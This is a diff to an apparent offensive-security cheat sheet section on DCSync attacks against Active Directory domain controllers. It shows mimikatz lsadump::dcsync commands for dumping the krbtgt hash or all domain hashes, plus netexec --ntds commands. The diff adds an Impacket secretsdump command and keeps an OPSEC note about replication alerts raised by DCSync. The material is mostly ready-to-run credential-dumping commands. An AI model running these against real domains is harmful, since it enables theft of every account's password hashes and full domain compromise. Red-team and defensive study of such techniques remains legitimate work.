@@ -20,21 +20,26 @@ reg query HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters /v "DSA Databas
 
 DCSync is a technique used by attackers to obtain sensitive information, including password hashes, from a domain controller in an Active Directory environment. Any member of Administrators, Domain Admins, or Enterprise Admins as well as Domain Controller computer accounts are able to run DCSync to pull password data.
 
+#### From Windows:
 - DCSync only one user
 
-  ```powershell
+  ```ps1
   mimikatz# lsadump::dcsync /domain:htb.local /user:krbtgt
   ```
 
 - DCSync all users of the domain
 
-  ```powershell
+  ```ps1
   mimikatz# lsadump::dcsync /domain:htb.local /all /csv
 
   netexec smb 10.10.10.10 -u 'username' -p 'password' --ntds
   netexec smb 10.10.10.10 -u 'username' -p 'password' --ntds drsuapi
   ```
-
+#### From Linux:
+- DCSync Using Impacket Secretsdump
+  ```bash
+  secretsdump.py -outputfile <outfile> -just-dc <domain/user>@<dc ip> 
+  ```
 > :warning: OPSEC NOTE: Replication is always done between 2 Computers. Doing a DCSync from a user account can raise alerts.
 
 ## Volume Shadow Copy
